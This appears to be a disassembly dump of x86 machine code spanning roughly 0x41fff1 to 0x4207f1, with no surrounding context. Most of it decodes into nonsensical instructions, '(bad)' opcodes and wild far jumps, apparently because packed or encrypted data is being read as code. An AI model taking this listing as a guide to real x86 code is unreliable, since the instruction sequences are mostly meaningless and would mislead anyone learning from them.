  41fff1:	or     BYTE PTR [ecx-0x2694db2d],cl
  41fff7:	stos   DWORD PTR es:[edi],eax
  41fff8:	(bad)  
  41fff9:	imul   edi,DWORD PTR [edx+edx*2],0x171599ea
  420000:	pop    ecx
  420001:	pop    ebx
  420002:	sub    edx,DWORD PTR [ecx+esi*8+0x5b]
  420006:	sbb    al,BYTE PTR [eax+0x19]
  420009:	pop    ecx
  42000a:	bnd je 0x41ffc7
  42000d:	fsubrp st(3),st
  42000f:	mov    esi,0x92501c4c
  420014:	gs pusha 
  420016:	or     al,BYTE PTR [ebx-0x2b]
  420019:	inc    ebp
  42001a:	pop    ss
  42001b:	rol    DWORD PTR [edi+0x1a],1
  42001e:	pop    ds
  42001f:	sbb    ebp,0xa2375a12
  420025:	xchg   ebx,eax
  420026:	cmp    DWORD PTR [edx-0x5c7e125b],eax
  42002c:	mov    esi,0x9ffa1621
  420031:	dec    esi
  420032:	cmc    
  420033:	mov    ebp,0x78b321f9
  420038:	jge    0x41fff6
  42003a:	stos   DWORD PTR es:[edi],eax
  42003b:	mov    esp,0x6cd01441
  420040:	lea    edi,[ecx]
  420042:	mov    edx,0xd7d02e0b
  420047:	add    eax,0xfae7a929
  42004c:	fwait
  42004d:	les    eax,FWORD PTR [edx-0x2a]
  420050:	mov    al,0xb9
  420052:	xor    DWORD PTR [edx],eax
  420054:	cmp    ebp,DWORD PTR [esi]
  420056:	jmp    0x5ba529c6
  42005b:	mov    dl,0x9e
  42005d:	sahf   
  42005e:	jae    0x420000
  420060:	ins    DWORD PTR es:[edi],dx
  420061:	pop    ebx
  420062:	popf   
  420063:	jno    0x420099
  420065:	dec    ecx
  420066:	leave  
  420067:	dec    ebx
  420068:	xchg   esp,eax
  420069:	fist   WORD PTR [edx-0x7c]
  42006c:	jge    0x41fff0
  42006e:	push   edx
  42006f:	pop    es
  420070:	jmp    0x4200a2
  420072:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420073:	dec    ecx
  420074:	sbb    ecx,DWORD PTR [esi-0x6a]
  420077:	ins    BYTE PTR es:[edi],dx
  420078:	(bad)  
  420079:	clc    
  42007a:	add    eax,0x8113baba
  42007f:	push   0x1c
  420081:	or     ch,bh
  420083:	outs   dx,DWORD PTR ds:[esi]
  420084:	sub    ecx,esi
  420086:	test   al,0x0
  420088:	test   DWORD PTR [eiz*8-0x1222a5e8],eax
  42008f:	aaa    
  420090:	jecxz  0x42010b
  420092:	unpcklps xmm7,XMMWORD PTR [ebx]
  420095:	aaa    
  420096:	or     al,0x4c
  420098:	adc    bl,dl
  42009a:	or     ebx,DWORD PTR [eax+eiz*4-0x7d]
  42009e:	pushf  
  42009f:	xchg   ebp,eax
  4200a0:	jnp    0x420076
  4200a2:	jae    0x4200f1
  4200a4:	ret    
  4200a5:	xor    DWORD PTR [edx],eax
  4200a7:	inc    ebp
  4200a8:	es xchg ecx,eax
  4200aa:	add    BYTE PTR [esi+0x5ed38d],ah
  4200b0:	nop
  4200b1:	sbb    DWORD PTR [ecx+edi*4+0x23ea9e97],0xffffffc3
  4200b9:	jge    0x4200d0
  4200bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200bc:	add    BYTE PTR [edx],bh
  4200be:	cmp    DWORD PTR [ebp-0x4b83926b],edx
  4200c4:	xchg   DWORD PTR [ebp+0x1e2d036c],edx
  4200ca:	call   0xa9dda659
  4200cf:	push   esp
  4200d0:	sar    DWORD PTR [eax-0x5ede08a0],cl
  4200d6:	cmp    BYTE PTR [ebx+0x7],cl
  4200d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200da:	dec    esi
  4200db:	xor    bh,al
  4200dd:	out    dx,al
  4200de:	push   ebx
  4200df:	push   es
  4200e0:	(bad)  
  4200e1:	(bad)  
  4200e3:	and    eax,DWORD PTR ds:0x911866a
  4200e9:	mov    eax,0x1d63248e
  4200ee:	cmp    edi,edx
  4200f0:	mov    ebx,ebx
  4200f2:	sbb    edx,DWORD PTR [edx+0x0]
  4200f5:	xor    al,0x66
  4200f7:	retf   
  4200f8:	out    dx,eax
  4200f9:	push   0xdfc82f5a
  4200fe:	pushf  
  4200ff:	sub    DWORD PTR ds:0x28fdedc1,esi
  420105:	repz xor al,0x6a
  420108:	cmp    sp,WORD PTR [edx]
  42010b:	ss stos BYTE PTR es:[edi],al
  42010d:	es enter 0xf3d4,0x4e
  420112:	jp     0x4200cc
  420114:	inc    eax
  420115:	bnd je 0x420193
  420118:	scas   al,BYTE PTR es:[edi]
  420119:	inc    edx
  42011a:	and    eax,0xf39b17ae
  42011f:	test   ch,cl
  420121:	dec    edx
  420122:	std    
  420123:	fistp  WORD PTR [esi-0x23]
  420126:	xchg   ebp,eax
  420127:	out    0x90,eax
  420129:	fcom   QWORD PTR [ebx+0x257aa4b3]
  42012f:	mov    eax,ds:0x1ae3f531
  420134:	test   al,0x6b
  420136:	imul   eax,DWORD PTR [eax-0x6895b9b6],0x3e
  42013d:	and    BYTE PTR [edi-0x12],ah
  420140:	jne    0x4200e7
  420142:	xchg   ecx,eax
  420143:	mov    ebp,0xf4450eda
  420148:	loopne 0x42012f
  42014a:	outs   dx,DWORD PTR ds:[esi]
  42014b:	adc    eax,DWORD PTR [edx]
  42014d:	jle    0x4200e5
  42014f:	and    al,BYTE PTR [edx+0x7b239d77]
  420155:	xor    esp,DWORD PTR [edx+0x2af64a6d]
  42015b:	xchg   edi,eax
  42015c:	int    0x65
  42015e:	fimul  DWORD PTR [edx]
  420160:	aas    
  420161:	fstp   TBYTE PTR [ebp+0x67]
  420164:	mov    ds:0xdcf543b2,al
  420169:	xchg   ebp,eax
  42016a:	sub    bh,BYTE PTR [ebp+0x15]
  42016d:	add    eax,0xadb19a24
  420172:	pop    ss
  420173:	iret   
  420174:	inc    esi
  420175:	or     esi,esi
  420177:	xor    ch,BYTE PTR [eax-0x1e4da659]
  42017d:	mov    ebx,0xf904c20e
  420182:	jmp    0x42016f
  420184:	sub    al,0xa1
  420186:	inc    esi
  420187:	(bad)  
  420188:	in     al,dx
  420189:	pop    eax
  42018a:	and    BYTE PTR [edx],al
  42018c:	jp     0x42010e
  42018e:	sub    dl,BYTE PTR [eax-0x5d]
  420191:	into   
  420192:	aaa    
  420193:	repnz sub ch,BYTE PTR [edx]
  420196:	jmp    0x420166
  420198:	push   DWORD PTR [ecx-0x63]
  42019b:	pop    esp
  42019c:	arpl   dx,dx
  42019e:	mov    ch,0xb9
  4201a0:	lods   al,BYTE PTR ds:[esi]
  4201a1:	pop    ecx
  4201a2:	pushf  
  4201a3:	shr    DWORD PTR [ecx-0x2b0fd3f9],1
  4201a9:	mov    bh,0x64
  4201ab:	mov    ebx,0x53181792
  4201b0:	sub    ah,0x7f
  4201b3:	imul   ebx,DWORD PTR [edi+ebp*8],0x87233ce
  4201ba:	shl    BYTE PTR [edx+ebx*4+0x35],cl
  4201be:	out    dx,eax
  4201bf:	inc    edx
  4201c0:	cwde   
  4201c1:	stos   DWORD PTR es:[edi],eax
  4201c2:	push   0x47
  4201c4:	sbb    BYTE PTR [ebp+0x4d],0xcb
  4201c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201c9:	lea    ebx,[ebx]
  4201cb:	cli    
  4201cc:	or     esp,DWORD PTR [ecx-0x79]
  4201cf:	or     DWORD PTR [edx+0x70],esp
  4201d2:	outs   dx,BYTE PTR ds:[esi]
  4201d3:	inc    edx
  4201d4:	outs   dx,BYTE PTR ds:[esi]
  4201d5:	jns    0x42022d
  4201d7:	js     0x42021b
  4201d9:	out    dx,al
  4201da:	imul   ecx,DWORD PTR [ebp+0x3cfad2f0],0x2c
  4201e1:	jb     0x4201c9
  4201e3:	inc    edx
  4201e4:	out    0x9a,al
  4201e6:	cwde   
  4201e7:	fist   DWORD PTR [ecx+0x965d1c6]
  4201ed:	ins    DWORD PTR es:[edi],dx
  4201ee:	add    eax,esp
  4201f0:	cmp    BYTE PTR [ecx-0x7f],0xb5
  4201f4:	loop   0x420242
  4201f6:	iret   
  4201f7:	nop
  4201f8:	push   edx
  4201f9:	mov    edi,DWORD PTR [ecx+0xa359803]
  4201ff:	cwde   
  420200:	mov    al,0x35
  420202:	inc    ebx
  420203:	pop    eax
  420204:	mov    eax,0x86c32ccb
  420209:	push   ss
  42020a:	push   ecx
  42020b:	xlat   BYTE PTR ds:[ebx]
  42020c:	pop    esp
  42020d:	xchg   esp,eax
  42020e:	mov    ds:0xdce1cc31,eax
  420213:	pop    ecx
  420214:	test   eax,0x957b2e1e
  420219:	retf   
  42021a:	das    
  42021b:	pusha  
  42021c:	int    0xbd
  42021e:	fs pop ecx
  420220:	push   esi
  420221:	push   es
  420222:	test   DWORD PTR [eax-0x56],eax
  420225:	pop    es
  420226:	shl    BYTE PTR [edi-0x2efee27f],1
  42022c:	push   eax
  42022d:	ror    BYTE PTR [ebx],cl
  42022f:	inc    eax
  420230:	push   ebp
  420231:	bound  eax,QWORD PTR gs:[esi]
  420234:	ins    BYTE PTR es:[edi],dx
  420235:	enter  0x1a66,0x30
  420239:	mov    edi,0xfc83b46e
  42023e:	push   edi
  42023f:	ja     0x4201ca
  420241:	ds cmp al,0x90
  420244:	pop    es
  420245:	mov    bh,dl
  420247:	jmp    0x4eb4:0x9241d4a2
  42024e:	push   es
  42024f:	xchg   ebp,eax
  420250:	push   ds
  420251:	loop   0x4202cc
  420253:	adc    BYTE PTR [ebx+0x15ac2f2a],al
  420259:	and    BYTE PTR fs:[ebp+0x724eb2d],dl
  420260:	jl     0x4202c6
  420262:	mov    ebp,0x23c3c71c
  420267:	mov    dh,0x71
  420269:	lds    ebx,FWORD PTR [ecx+0x61]
  42026c:	dec    esp
  42026d:	mov    eax,ds:0xae30336
  420272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420273:	into   
  420274:	mov    DWORD PTR [edx-0x40],ebp
  420277:	sti    
  420278:	or     BYTE PTR [ebx+0x5cb885a8],dl
  42027e:	test   BYTE PTR [ebp-0x23],0xc0
  420282:	xor    BYTE PTR [ebp+0x824875c],dh
  420288:	(bad)  
  420289:	fild   DWORD PTR [edx]
  42028b:	mov    cl,0x30
  42028d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42028e:	call   0x115e:0x4a09b0de
  420295:	and    bh,BYTE PTR [ecx+0x79114a0e]
  42029b:	and    ch,BYTE PTR [ebp-0x477347a2]
  4202a1:	fisttp DWORD PTR [ebp-0x78]
  4202a4:	or     eax,DWORD PTR [edx+edx*4+0x49]
  4202a8:	(bad)  
  4202a9:	fdiv   st(3),st
  4202ab:	pop    es
  4202ac:	out    0xf9,al
  4202ae:	mov    eax,0xf930c377
  4202b3:	popf   
  4202b4:	xchg   DWORD PTR [esi],ebp
  4202b6:	lods   eax,DWORD PTR ds:[esi]
  4202b7:	in     al,0xfe
  4202b9:	or     al,0xb2
  4202bb:	xchg   esi,eax
  4202bc:	xchg   esp,eax
  4202bd:	jg     0x4202f8
  4202bf:	scas   eax,DWORD PTR es:[edi]
  4202c0:	cmp    DWORD PTR [ebp+0x2d0d0715],edi
  4202c6:	in     al,0xbd
  4202c8:	popa   
  4202c9:	in     al,dx
  4202ca:	jmp    0x159b:0xc637055f
  4202d1:	mov    ebp,0x1f049b35
  4202d6:	loop   0x4202e4
  4202d8:	mov    ds:0xef06a6c9,al
  4202dd:	sbb    edi,DWORD PTR [esi]
  4202df:	imul   edi,DWORD PTR [ecx],0x2d
  4202e2:	outs   dx,BYTE PTR ds:[esi]
  4202e3:	sub    ah,cl
  4202e5:	mov    eax,0xbb952fb6
  4202ea:	cmp    eax,eax
  4202ec:	call   0xd7209f00
  4202f1:	ss dec ax
  4202f4:	sub    BYTE PTR [eax+0xe892964],0xe0
  4202fb:	jg     0x4202f4
  4202fd:	lahf   
  4202fe:	or     edx,DWORD PTR [ecx+0x31]
  420301:	mov    edi,esp
  420303:	popa   
  420304:	dec    edi
  420305:	push   cs
  420306:	into   
  420307:	xor    eax,0x83206a1b
  42030c:	jno    0x420353
  42030e:	fcomp  DWORD PTR [eax-0x53a94c67]
  420314:	mov    esp,gs
  420316:	das    
  420317:	pop    edi
  420318:	mov    dh,0xff
  42031a:	into   
  42031b:	pop    ss
  42031c:	xor    DWORD PTR [edi+0x3dc7058],ebx
  420322:	dec    ebx
  420323:	or     BYTE PTR [esi-0x5c],bl
  420326:	mov    dl,0xde
  420328:	retf   
  420329:	ror    DWORD PTR [ebx+0x788b67d3],cl
  42032f:	push   ds
  420330:	inc    esp
  420331:	cwde   
  420332:	xlat   BYTE PTR ds:[ebx]
  420333:	xchg   dh,dl
  420335:	dec    esi
  420336:	dec    edx
  420337:	push   edx
  420338:	loop   0x420317
  42033a:	retf   
  42033b:	mov    dl,0x1e
  42033d:	scas   al,BYTE PTR es:[edi]
  42033e:	(bad)  
  42033f:	fcom   DWORD PTR [eax]
  420341:	xchg   esp,eax
  420342:	mov    al,ds:0xd643717e
  420347:	mov    DWORD PTR [ebp+0x1f],ebp
  42034a:	cmc    
  42034b:	cli    
  42034c:	xor    eax,0x15d3497d
  420351:	xor    eax,0x421b7551
  420356:	cmp    eax,0x38e72a9e
  42035b:	mov    al,ds:0x37a1f24b
  420360:	jge    0x42034d
  420362:	pop    ebp
  420363:	xor    eax,ebp
  420365:	mov    al,ds:0x5ebeda
  42036a:	scas   eax,DWORD PTR es:[edi]
  42036b:	xor    BYTE PTR [ecx+0x7886380d],0xd9
  420372:	lds    eax,FWORD PTR [ecx+0x0]
  420375:	pop    ss
  420376:	enter  0xb42c,0xbb
  42037a:	jns    0x4203ef
  42037c:	(bad)  
  42037d:	sub    ah,BYTE PTR [eax-0x41]
  420380:	test   BYTE PTR [edi],0xff
  420383:	std    
  420384:	das    
  420385:	jecxz  0x4203a2
  420387:	scas   eax,DWORD PTR es:[edi]
  420388:	ja     0x4203dd
  42038a:	jnp    0x4203ff
  42038c:	mov    bl,BYTE PTR [edx-0x293e1358]
  420392:	dec    esi
  420393:	(bad)  [esi+0x28]
  420396:	add    eax,0x28b0cd04
  42039b:	xor    ch,al
  42039d:	and    cl,dl
  42039f:	push   eax
  4203a0:	test   eax,0x65a4e
  4203a5:	dec    edi
  4203a6:	mov    ch,0xef
  4203a8:	or     ecx,DWORD PTR [edi]
  4203aa:	js     0x420409
  4203ac:	and    al,0xf4
  4203ae:	add    cl,BYTE PTR [ebx+0x3b]
  4203b1:	mov    edx,0x12ce0dbd
  4203b6:	inc    ebx
  4203b7:	out    0xea,eax
  4203b9:	hlt    
  4203ba:	cld    
  4203bb:	(bad)  
  4203bd:	das    
  4203be:	pop    ebx
  4203bf:	or     ah,BYTE PTR [edx-0x713cac45]
  4203c5:	mov    al,0x3f
  4203c7:	rcl    DWORD PTR [edi+0x562091cd],cl
  4203cd:	pop    edx
  4203ce:	push   0x462e8668
  4203d3:	sub    eax,ecx
  4203d5:	imul   edi,DWORD PTR [edx+0x46],0x8f32cbdf
  4203dc:	inc    edx
  4203dd:	inc    edi
  4203de:	push   es
  4203df:	or     DWORD PTR [eax],edx
  4203e1:	adc    eax,0xa3bfc5e8
  4203e6:	(bad)  
  4203e7:	in     eax,dx
  4203e8:	mov    ch,BYTE PTR [edi-0x2fd0d3ff]
  4203ee:	test   DWORD PTR ds:0xf87843d1,ecx
  4203f4:	test   bh,ch
  4203f6:	loope  0x4203c3
  4203f8:	lahf   
  4203f9:	and    eax,0x78f27545
  4203fe:	xor    ebp,esp
  420400:	mov    ds:0xf5dc2ed2,eax
  420405:	(bad)  
  420407:	adc    al,0x8f
  420409:	push   0x5ba71900
  42040e:	dec    esp
  42040f:	jnp    0x420422
  420411:	test   eax,0x385a58bf
  420416:	xchg   edx,eax
  420417:	push   ss
  420418:	hlt    
  420419:	mov    ebp,0x1fc54c53
  42041e:	xor    al,0x73
  420420:	xlat   BYTE PTR ds:[ebx]
  420421:	sub    ebp,DWORD PTR [esi]
  420423:	xor    al,0xc7
  420425:	sub    eax,0xa8117609
  42042a:	call   0x3328:0x1d9ae79e
  420431:	retf   
  420432:	xor    esp,0xca0d2247
  420438:	jp     0x420479
  42043a:	inc    esi
  42043b:	push   edi
  42043c:	push   esi
  42043d:	or     al,0xe5
  42043f:	push   ss
  420440:	retf   0x76a8
  420443:	jp     0x420496
  420445:	mov    ch,0xd6
  420447:	sub    BYTE PTR [ebp+0x3e2bc1f6],al
  42044d:	out    0x81,al
  42044f:	xor    esp,DWORD PTR [edi+0x2]
  420452:	xchg   ecx,eax
  420453:	pushf  
  420454:	jg     0x4203e8
  420456:	test   al,0x43
  420458:	adc    DWORD PTR [edx-0x57982f83],ebx
  42045e:	pop    ss
  42045f:	sub    esp,esp
  420461:	xchg   esi,eax
  420462:	test   DWORD PTR [bp+di],esp
  420465:	in     al,0x76
  420467:	mov    ebp,0x77d493d1
  42046c:	lods   al,BYTE PTR ds:[esi]
  42046d:	mov    eax,0x983b4c71
  420472:	xchg   edx,eax
  420473:	jg     0x42044b
  420475:	mov    ds:0x455ca29d,eax
  42047a:	data16 in al,0x5b
  42047d:	add    ecx,DWORD PTR [ebp-0x5b]
  420480:	and    edi,eax
  420482:	mov    ebp,0xd8cd7c16
  420487:	push   esp
  420488:	mov    bh,0xc
  42048a:	jbe    0x4204af
  42048c:	sbb    ah,BYTE PTR [ebx-0x30]
  42048f:	iret   
  420490:	ja     0x42049e
  420496:	mov    edx,DWORD PTR [ebp-0x2c]
  420499:	jmp    0x42280a
  42049e:	mov    edx,DWORD PTR [ebp-0x34]
  4204a1:	mov    edi,DWORD PTR [ebp-0x4]
  4204a4:	xor    edx,eax
  4204a6:	xor    edi,eax
  4204a8:	jmp    0x4209ba
  4204ad:	retf   
  4204ae:	ds rol bl,1
  4204b1:	(bad)  
  4204b3:	fcmovnb st,st(6)
  4204b5:	push   DWORD PTR [edi-0x7c632494]
  4204bb:	push   ebp
  4204bc:	rcr    BYTE PTR ds:0x73787f59,cl
  4204c2:	jl     0x42053c
  4204c4:	js     0x42049e
  4204c6:	or     DWORD PTR [eax],ecx
  4204c8:	jecxz  0x42044e
  4204ca:	push   ebp
  4204cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204cc:	fstp   TBYTE PTR [ecx+eax*8+0xd4c7066]
  4204d3:	jno    0x420527
  4204d5:	sub    BYTE PTR [eax-0x6991377c],cl
  4204db:	push   ecx
  4204dc:	pop    ebx
  4204dd:	inc    esp
  4204de:	mov    fs,ecx
  4204e0:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4204e2:	mov    ebp,0x5f7b3e2c
  4204e7:	add    BYTE PTR [esi],0xb1
  4204ea:	jp     0x4204bc
  4204ec:	loope  0x42056b
  4204ee:	mov    dl,0x1d
  4204f0:	push   0x3f15dc6e
  4204f5:	pop    esp
  4204f6:	xor    edx,ecx
  4204f8:	sar    bl,1
  4204fa:	sub    ecx,DWORD PTR [esi-0x39]
  4204fd:	popa   
  4204fe:	dec    esp
  4204ff:	jg     0x4204bb
  420501:	pop    esi
  420502:	mov    eax,0xebdb94f9
  420507:	rcl    BYTE PTR [edi+0x16],cl
  42050a:	jmp    0x5046:0xe32b461d
  420511:	pushf  
  420512:	and    eax,0x728eaa8
  420517:	push   edx
  420518:	or     al,0x48
  42051a:	js     0x4204d5
  42051c:	inc    ecx
  42051d:	sbb    edx,esp
  42051f:	popa   
  420520:	sbb    DWORD PTR [esi+ebx*2+0xd],esp
  420524:	dec    esp
  420525:	bsf    edi,eax
  420528:	jle    0x420535
  42052a:	iret   
  42052b:	test   al,0x1
  42052d:	add    BYTE PTR [eax+0x21df7486],ah
  420533:	sbb    BYTE PTR [esi+0x2f],dl
  420536:	inc    eax
  420537:	into   
  420538:	stos   DWORD PTR es:[edi],eax
  420539:	add    DWORD PTR [edx+0x6f795975],0xe
  420540:	push   esi
  420541:	(bad)  
  420542:	jmp    0x8a7c:0xd7c51127
  420549:	aad    0x3d
  42054b:	(bad)  
  42054c:	jg     0x42057b
  42054e:	mov    ebp,0x41fb93d6
  420553:	idiv   DWORD PTR es:[esi+0x6bb2e47e]
  42055a:	or     al,0xc4
  42055c:	mov    DWORD PTR [esi],0x20e4e7c5
  420562:	sbb    eax,0x4fc848ef
  420567:	and    dl,bh
  420569:	push   edi
  42056a:	push   eax
  42056b:	xor    BYTE PTR [edx-0x39dd907b],dl
  420571:	ret    
  420572:	pop    ecx
  420573:	das    
  420574:	(bad)  
  420575:	jmp    0x42055b
  420577:	clc    
  420578:	cld    
  420579:	inc    edi
  42057a:	mov    BYTE PTR [eax-0x6f436a74],0x84
  420581:	push   0x6f
  420583:	fidivr DWORD PTR [ecx]
  420585:	daa    
  420586:	inc    edx
  420587:	loope  0x4205a9
  420589:	sar    BYTE PTR ds:0x484ad9c9,cl
  42058f:	dec    ebp
  420590:	inc    ebp
  420591:	sahf   
  420592:	pop    edi
  420593:	push   0x19331609
  420598:	fst    QWORD PTR [ecx+0x7c9d8fac]
  42059e:	test   BYTE PTR ds:0x54cd4a31,0xf0
  4205a5:	pop    esi
  4205a6:	fnstenv [ecx+0x44]
  4205a9:	sub    edx,ebx
  4205ab:	pop    edx
  4205ac:	in     eax,0x6
  4205ae:	adc    eax,0xae2e4f93
  4205b3:	retf   0x380f
  4205b6:	sbb    edx,DWORD PTR [eax-0x78261651]
  4205bc:	aad    0x97
  4205be:	outs   dx,BYTE PTR ds:[esi]
  4205bf:	pop    ss
  4205c0:	push   ebp
  4205c1:	lods   eax,DWORD PTR ds:[esi]
  4205c2:	xchg   esp,eax
  4205c3:	icebp  
  4205c4:	fwait
  4205c5:	add    eax,0xa254cfd8
  4205ca:	jbe    0x420579
  4205cc:	das    
  4205cd:	xor    eax,0xdf17c4d4
  4205d2:	bound  eax,QWORD PTR [eax]
  4205d4:	adc    al,BYTE PTR [edx+edx*4]
  4205d7:	icebp  
  4205d8:	jbe    0x420591
  4205da:	dec    esp
  4205db:	mov    edi,0x35810e8e
  4205e0:	pop    edx
  4205e1:	mov    eax,ds:0x1fc5f9f4
  4205e6:	cmp    eax,0xcf36c50
  4205eb:	add    BYTE PTR [eax+0x78a29bf1],ch
  4205f1:	test   eax,0x987a18b0
  4205f6:	mov    bh,0xba
  4205f8:	sub    al,0xb
  4205fa:	lds    edx,FWORD PTR [edx+0x46e5e81c]
  420600:	ins    BYTE PTR es:[edi],dx
  420601:	rol    DWORD PTR [edi-0xd9e90e2],1
  420607:	add    ah,BYTE PTR [edx-0x7ba86b86]
  42060d:	outs   dx,BYTE PTR ds:[esi]
  42060e:	push   es
  42060f:	dec    esp
  420610:	aas    
  420611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420612:	adc    bl,BYTE PTR [edx-0x7af60848]
  420618:	rcl    dh,cl
  42061a:	jl     0x42062b
  42061c:	xchg   ebp,eax
  42061d:	test   al,0x5d
  42061f:	ja     0x420622
  420621:	pop    edi
  420622:	and    BYTE PTR [esi],al
  420624:	scas   eax,DWORD PTR es:[edi]
  420625:	jae    0x42067a
  420627:	cmp    edi,edx
  420629:	shl    DWORD PTR ds:0xb9c4c1b0,cl
  42062f:	cmp    DWORD PTR [ebx],ecx
  420631:	iret   
  420632:	or     eax,DWORD PTR [edx*8+0x5488d299]
  420639:	into   
  42063a:	(bad)  
  42063c:	push   0xbfd00e98
  420641:	xchg   edx,eax
  420642:	jle    0x420620
  420644:	push   esi
  420645:	jne    0x42065d
  420647:	mov    ecx,0xd479509d
  42064c:	push   0x2f
  42064e:	and    edi,DWORD PTR [edx-0x73]
  420651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420652:	mov    ah,0xb4
  420654:	call   0x64ed3efe
  420659:	sub    dh,BYTE PTR [ebx]
  42065b:	xlat   BYTE PTR ds:[ebx]
  42065c:	sahf   
  42065d:	xor    al,0x51
  42065f:	fsub   DWORD PTR [edx-0x3b]
  420662:	stos   DWORD PTR es:[edi],eax
  420663:	fdivr  QWORD PTR [ebx]
  420665:	add    esi,esi
  420667:	loopne 0x4206e6
  420669:	test   eax,0x1f051816
  42066e:	(bad)  
  42066f:	scas   eax,DWORD PTR es:[edi]
  420670:	das    
  420671:	jmp    0x420625
  420673:	mov    ah,0x4d
  420675:	xchg   DWORD PTR [ebp-0x5c],ecx
  420678:	scas   eax,DWORD PTR es:[edi]
  420679:	inc    eax
  42067a:	jmp    0x30fc:0x932016e4
  420681:	xor    eax,DWORD PTR [ebx]
  420683:	pop    ecx
  420684:	pop    ecx
  420685:	xor    eax,DWORD PTR [esi+0x42a7e993]
  42068b:	nop
  42068c:	mov    bl,0x57
  42068e:	cld    
  42068f:	adc    al,0xe5
  420691:	pushf  
  420692:	lock sub ecx,DWORD PTR [eax+0x27]
  420696:	ds push 0x4e
  420699:	test   BYTE PTR [ebx+0x3d8b673a],bl
  42069f:	pop    es
  4206a0:	xchg   edi,eax
  4206a1:	std    
  4206a2:	in     al,0xd3
  4206a4:	sub    BYTE PTR [ebp+0x3],0xbb
  4206a8:	jo     0x420714
  4206aa:	ror    ebp,cl
  4206ac:	sbb    eax,0xcec47750
  4206b1:	dec    edi
  4206b2:	xchg   edi,eax
  4206b3:	mov    ah,0x1a
  4206b5:	jb     0x420691
  4206b7:	les    edx,FWORD PTR [ebx+0x76]
  4206ba:	jae    0x42068f
  4206bc:	js     0x4206d1
  4206be:	lea    eax,[edi+0x3f063eee]
  4206c4:	inc    edx
  4206c5:	je     0x4206fd
  4206c7:	imul   ecx,DWORD PTR [esi+0x37],0xffffff84
  4206cb:	retf   
  4206cc:	pop    ecx
  4206cd:	repz enter 0x4bdf,0xe7
  4206d2:	push   eax
  4206d3:	and    eax,0xe3cb08b0
  4206d8:	add    edi,DWORD PTR [esi-0x3cc311fb]
  4206de:	pop    ds
  4206df:	adc    ah,BYTE PTR [edx-0x11]
  4206e2:	iret   
  4206e3:	mov    ?,WORD PTR [edx+0x1792c510]
  4206e9:	and    DWORD PTR [eax-0x4958c049],ebx
  4206ef:	sub    cl,BYTE PTR [edx+0x2d44ac2b]
  4206f5:	xchg   DWORD PTR [esi+0x7c],eax
  4206f8:	lock retf 0xa634
  4206fc:	out    0xff,eax
  4206fe:	lods   eax,DWORD PTR ds:[esi]
  4206ff:	xchg   esp,eax
  420700:	or     BYTE PTR [edi],dh
  420702:	sbb    esp,DWORD PTR [ebx-0x1ecca781]
  420708:	xchg   esi,eax
  420709:	dec    ebx
  42070a:	jne    0x420699
  42070c:	dec    ebp
  42070d:	loopne 0x420708
  42070f:	jae    0x42074c
  420711:	es sti 
  420713:	mov    eax,0xa9c676fa
  420718:	push   ecx
  420719:	sub    BYTE PTR [esi+0x6f3cf265],bl
  42071f:	inc    edx
  420720:	fld    DWORD PTR [esi+0x140abaff]
  420726:	xchg   ecx,eax
  420727:	cmp    eax,0xaa7e13df
  42072c:	enter  0xc1,0x70
  420730:	mov    ecx,edx
  420732:	mov    al,0x7f
  420734:	xchg   DWORD PTR [eax-0x29ca1239],esp
  42073a:	mov    ah,0xb3
  42073c:	out    dx,al
  42073d:	ret    
  42073e:	out    0xfb,al
  420740:	ret    
  420741:	cmp    BYTE PTR [ecx],ch
  420743:	mov    bl,0x26
  420745:	sti    
  420746:	dec    eax
  420747:	test   eax,0xce956e10
  42074c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42074d:	mov    edi,0x63966a84
  420752:	mov    eax,0xe63e4441
  420757:	push   0xffffffee
  420759:	pop    eax
  42075a:	sub    ch,0xfd
  42075d:	ret    0x8917
  420760:	or     edi,DWORD PTR [edx-0x786d8a3e]
  420766:	xchg   ecx,eax
  420767:	jge    0x42072e
  420769:	loopne 0x42071a
  42076b:	into   
  42076c:	imul   ebx,DWORD PTR [ebx-0x64],0x34
  420770:	js     0x42072b
  420772:	retf   
  420773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420774:	imul   esi,DWORD PTR [edx+0x78],0x173e240c
  42077b:	sub    cl,bl
  42077d:	add    al,0x85
  42077f:	xchg   esp,eax
  420780:	mov    al,0x9e
  420782:	push   ebp
  420783:	dec    ebx
  420784:	leave  
  420785:	int3   
  420786:	call   0xd331:0x264a7142
  42078d:	mov    bh,0x16
  42078f:	pop    edx
  420790:	inc    ebx
  420791:	sbb    BYTE PTR [edi+0x4b],ch
  420794:	or     esi,DWORD PTR [esi+0x72f785c0]
  42079a:	xchg   ecx,eax
  42079b:	jl     0x42072d
  42079d:	mov    edi,0xb6fe4a60
  4207a2:	add    bl,dh
  4207a4:	and    dh,BYTE PTR [esi+0x72]
  4207a7:	lea    ebx,ds:0x37f53361
  4207ad:	or     BYTE PTR [ebx-0x2f],bl
  4207b0:	sub    ecx,DWORD PTR [eax]
  4207b2:	(bad)  
  4207b4:	rol    BYTE PTR [ebp+0x1e716e77],0xa9
  4207bb:	xchg   BYTE PTR [ebp-0x4a],bh
  4207be:	imul   DWORD PTR [ebp+ebp*1-0x43e67dbd]
  4207c5:	push   ebx
  4207c6:	add    eax,eax
  4207c8:	jb     0x420806
  4207ca:	push   esi
  4207cb:	cwde   
  4207cc:	retf   
  4207cd:	(bad)  
  4207ce:	scas   eax,DWORD PTR es:[edi]
  4207cf:	xchg   BYTE PTR [ecx+0x27893c57],bl
  4207d5:	popa   
  4207d6:	jmp    0xa43f:0x3ff30bcf
  4207dd:	xor    ch,BYTE PTR [edi]
  4207df:	hlt    
  4207e0:	and    bl,bl
  4207e2:	pop    ebx
  4207e3:	jg     0x4207ae
  4207e5:	(bad)  
  4207e6:	mov    ds:0xbf9ac68,eax
  4207eb:	dec    esi
  4207ec:	test   BYTE PTR [esi],ch
  4207ee:	out    0x81,eax
  4207f0:	std    
  4207f1:	jb     0x42082d
